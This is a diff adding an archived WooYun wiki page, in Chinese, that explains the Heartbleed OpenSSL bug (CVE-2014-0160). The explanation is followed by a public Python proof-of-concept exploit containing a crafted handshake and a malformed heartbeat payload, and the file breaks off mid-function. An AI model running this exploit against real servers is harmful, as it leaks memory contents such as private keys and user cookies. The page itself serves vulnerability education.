@@ -1,0 +1,318 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.8 (453748)"/><meta name="created" content="2016-10-19 12:45:47 +0000"/><meta name="source" content="web.clip"/><meta name="source-url" content="https://web.archive.org/web/20160307183759/http://wiki.wooyun.org/server:openssl"/><meta name="updated" content="2016-10-19 12:45:47 +0000"/><title>server:openssl [WooYun WiKi]</title></head><body><div style="-evernote-webclip:true"><br/><div style="font-size: 16px"><div style="box-sizing:border-box;font-family:sans-serif;text-size-adjust:100%;font-size:10px;-webkit-tap-highlight-color:rgba(0, 0, 0, 0);"><div style="box-sizing:border-box;font-family:&quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:small;line-height:1.42857;color:rgb(51, 51, 51);background:rgb(253, 253, 253);"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;"><span style="box-sizing:border-box;"><div style="box-sizing:border-box;"><div style="box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;"><div style="box-sizing:border-box;"><span style="display:table;"/>
+
+                                          
+              <div style="box-sizing:border-box;position:fixed;float:right;z-index:1024;top:10px;right:10px;">
+                
+<div style="float:right;box-sizing:border-box;background-color:rgb(255, 255, 255);border-radius:4px;box-shadow:rgba(0, 0, 0, 0.0470588) 0px 1px 1px;border-color:rgb(221, 221, 221);border:1px solid transparent;margin:0px 0px 1.4em 1.4em;width:auto;color:inherit;font-size:0.95em;margin-left:20px;">
+<h3 style="border-bottom:1px solid transparent;box-sizing:border-box;border-top-left-radius:3px;font-weight:bold;color:rgb(51, 51, 51);border-color:rgb(221, 221, 221);background-color:rgb(245, 245, 245);font-family:inherit;line-height:1.1;border-top-right-radius:3px;padding:5px;font-size:0.95em;margin:0px;cursor:pointer;"><i style="box-sizing:border-box;position:relative;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;padding-right:5px;"><span style="font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;font-weight:400;line-height:1;"></span></i> <strong style="line-height:1;font-weight:400;top:1px;display:inline-block;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;position:relative;-webkit-font-smoothing:antialiased;box-sizing:border-box;float:right;margin:0px 0.2em;padding-right:5px;"><span style="font-weight:400;font-family:&quot;Glyphicons Halflings&quot;;font-style:normal;line-height:1;"></span></strong></h3>
+
+</div>
+
+              </div>
+
+              
+              
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+﻿
+</p>
+
+<h1 style="box-sizing:border-box;font-size:36px;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin:40px 0px 20px;padding-bottom:9px;border-bottom:1px solid rgb(238, 238, 238);margin-top:10px;">心脏出血（heart bleed）漏洞</h1>
+<div style="box-sizing:border-box;"
+
+/>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">1、漏洞简介</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+2014年4月7日OpenSSL的Heartbleed漏洞被曝光，该漏洞破坏性之大和影响的范围之广，堪称网络安全里程碑事件。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+该漏洞可读取服务器上内存中随机64KB数据，可能导致服务器内重要的敏感信息（如用户cookie，服务器秘钥）等泄露。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">2、漏洞成因</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+当使用基于openssl通信的双方建立安全连接后，客户端需要不断的发送心跳信息到服务器，以确保服务器是可用的。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+基本的流程是：客户端发送一段固定长度的字符串到服务器，服务器接收后，返回该固定长度的字符串。比如客户端发送“hello,world”字符串到服务器，服务器接受后，原样返回“hello,world”字符串，这样客户端就会认为openssl服务器是可用的。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+客户端发送的心跳信息结构体定义为：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(153, 51, 51);">struct</span> hb <span style="box-sizing:border-box;color:rgb(102, 204, 102);">{</span>
+      <span style="box-sizing:border-box;color:rgb(153, 51, 51);">int</span> type<span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>
+      <span style="box-sizing:border-box;color:rgb(153, 51, 51);">int</span> length<span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>
+      <span style="box-sizing:border-box;color:rgb(153, 51, 51);">unsigned</span> <span style="box-sizing:border-box;color:rgb(153, 51, 51);">char</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">*</span>data<span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span>                                                    
+<span style="box-sizing:border-box;color:rgb(102, 204, 102);">}</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">;</span></pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+其中type为心跳的类型，length为data的大小。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+其中关于data字段的内容结构为：
+</p>
+<ul style="box-sizing:border-box;margin-top:0px;margin-bottom:10px;">
+<li style="box-sizing:border-box;"><div style="box-sizing:border-box;">type字段占一个字节，payload字段占两个字节，其余的为payload的具体内容。</div>
+</li>
+</ul>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+详情如下所示：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;">字节序号        备注
+
+0                 type
+
+1-2              data中具体的内容的大小为payload
+
+3-len            具体的内容pl      </pre>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+当服务器收到消息后，会对该消息进行解析，也就是对data中的字符串进行解析，通过解析第0位得到type，第1-2位得到payload，接着申请(1+2+payload)大小的内存，然后再将相应的数据拷贝到该新申请的内存中。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+假如客户端发送的data数据为“006abcdef”，那么服务器端解析可以得到type=0, payload=06, pl='abcdef'，申请(1+2+6=9)大小的内存，然后再将type, payload, pl写到新申请的内存中。
+</p>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+但在存在漏洞的OpenSSL代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测。服务器会按照payload的大小申请内存并将内存中的数据发回给客户端。
+导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。
+</p>
+
+</div>
+
+<h3 style="box-sizing:border-box;font-family:inherit;font-weight:500;line-height:1.1;color:inherit;margin-top:20px;margin-bottom:10px;font-size:24px;">3、漏洞检测及利用</h3>
+<div style="box-sizing:border-box;">
+<hr style="border-left-style:initial;height:0px;margin-top:20px;margin-bottom:20px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;box-sizing:content-box;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(238, 238, 238);"/>
+
+<p style="box-sizing:border-box;margin:0px 0px 10px;">
+利用代码：
+</p>
+<pre style="line-height:1.42857;overflow:auto;font-size:13px;box-sizing:border-box;display:block;padding:9.5px;margin:0px 0px 10px;font-family:Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;color:rgb(51, 51, 51);word-break:break-all;word-wrap:break-word;background-color:rgb(245, 245, 245);border:1px solid rgb(204, 204, 204);border-radius:4px;"><span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;">#!/usr/bin/python</span>
+ 
+<span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span>
+<span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;"># The author disclaims copyright to this source code.</span>
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">sys</span>
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">struct</span>
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">socket</span>
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">time</span>
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">select</span>
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">re</span>
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">from</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">optparse</span> <span style="box-sizing:border-box;color:rgb(177, 177, 0);">import</span> OptionParser
+ 
+options <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> OptionParser<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>usage<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'%prog server [options]'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> description<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+options.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">add_option</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'-p'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'--port'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">type</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'int'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> default<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(204, 102, 204);">443</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">help</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'TCP port to test (default: 443)'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">def</span> h2bin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>x<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> x.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">replace</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">' '</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">''</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">replace</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'<span style="box-sizing:border-box;color:rgb(0, 0, 153);font-weight:bold;">\n</span>'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">''</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">decode</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'hex'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+ 
+hello <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> h2bin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'''
+16 03 02 00  dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+00 0f 00 01 01                                  
+'''</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+ 
+hb <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> h2bin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">''' 
+18 03 02 00 03
+01 40 00
+'''</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">def</span> hexdump<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">for</span> b <span style="box-sizing:border-box;color:rgb(177, 177, 0);">in</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">xrange</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">len</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">16</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+        lin <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span>c <span style="box-sizing:border-box;color:rgb(177, 177, 0);">for</span> c <span style="box-sizing:border-box;color:rgb(177, 177, 0);">in</span> s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span>b : b + <span style="box-sizing:border-box;color:rgb(204, 102, 204);">16</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span>
+        hxdat <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">' '</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">join</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'%02X'</span> % <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">ord</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>c<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> <span style="box-sizing:border-box;color:rgb(177, 177, 0);">for</span> c <span style="box-sizing:border-box;color:rgb(177, 177, 0);">in</span> lin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+        pdat <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">''</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">join</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>c <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">32</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&lt;=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">ord</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>c<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&lt;=</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">126</span> <span style="box-sizing:border-box;color:rgb(177, 177, 0);">else</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'.'</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(177, 177, 0);">for</span> c <span style="box-sizing:border-box;color:rgb(177, 177, 0);">in</span> lin<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'  %04x: %-48s %s'</span> % <span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>b<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> hxdat<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> pdat<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span>
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">def</span> recvall<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> length<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> timeout<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span><span style="box-sizing:border-box;color:rgb(204, 102, 204);">5</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+    endtime <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">time</span>.<span style="box-sizing:border-box;color:rgb(0, 0, 102);">time</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> + timeout
+    rdata <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">''</span>
+    remain <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> length
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">while</span> remain <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&gt;</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span>:
+        rtime <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> endtime - <span style="box-sizing:border-box;color:rgb(0, 0, 102);">time</span>.<span style="box-sizing:border-box;color:rgb(0, 0, 102);">time</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span> 
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> rtime <span style="box-sizing:border-box;color:rgb(102, 204, 102);">&lt;</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">0</span>:
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>
+        r<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> w<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> e <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">select</span>.<span style="box-sizing:border-box;color:rgb(0, 0, 102);">select</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(102, 204, 102);">[</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">]</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">5</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> s <span style="box-sizing:border-box;color:rgb(177, 177, 0);">in</span> r:
+            data <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> s.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">recv</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>remain<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+            <span style="box-sizing:border-box;color:rgb(128, 128, 128);font-style:italic;"># EOF?</span>
+            <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> <span style="box-sizing:border-box;color:rgb(177, 177, 0);">not</span> data:
+                <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>
+            rdata +<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> data
+            remain -<span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">len</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>data<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> rdata
+ 
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">def</span> recvmsg<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+    hdr <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> recvall<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">5</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> hdr <span style="box-sizing:border-box;color:rgb(177, 177, 0);">is</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>:
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Unexpected EOF receiving record header - server closed connection'</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>
+    typ<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ver<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ln <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> <span style="box-sizing:border-box;color:rgb(0, 0, 102);">struct</span>.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">unpack</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span><span style="box-sizing:border-box;color:rgb(255, 0, 0);">'&gt;BHH'</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> hdr<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    pay <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> recvall<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ln<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(204, 102, 204);">10</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> pay <span style="box-sizing:border-box;color:rgb(177, 177, 0);">is</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>:
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">'Unexpected EOF receiving record payload - server closed connection'</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">print</span> <span style="box-sizing:border-box;color:rgb(255, 0, 0);">' ... received message: type = %d, ver = %04x, length = %d'</span> % <span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>typ<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ver<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">len</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>pay<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">return</span> typ<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ver<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> pay
+ 
+<span style="box-sizing:border-box;color:rgb(177, 177, 0);">def</span> hit_hb<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>:
+    s.<span style="box-sizing:border-box;color:rgb(0, 102, 0);">send</span><span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>hb<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+    <span style="box-sizing:border-box;color:rgb(177, 177, 0);">while</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">True</span>:
+        typ<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> ver<span style="box-sizing:border-box;color:rgb(102, 204, 102);">,</span> pay <span style="box-sizing:border-box;color:rgb(102, 204, 102);">=</span> recvmsg<span style="box-sizing:border-box;color:rgb(102, 204, 102);">(</span>s<span style="box-sizing:border-box;color:rgb(102, 204, 102);">)</span>
+        <span style="box-sizing:border-box;color:rgb(177, 177, 0);">if</span> typ <span style="box-sizing:border-box;color:rgb(177, 177, 0);">is</span> <span style="box-sizing:border-box;color:rgb(0, 0, 0);font-weight:bold;">None</span>:
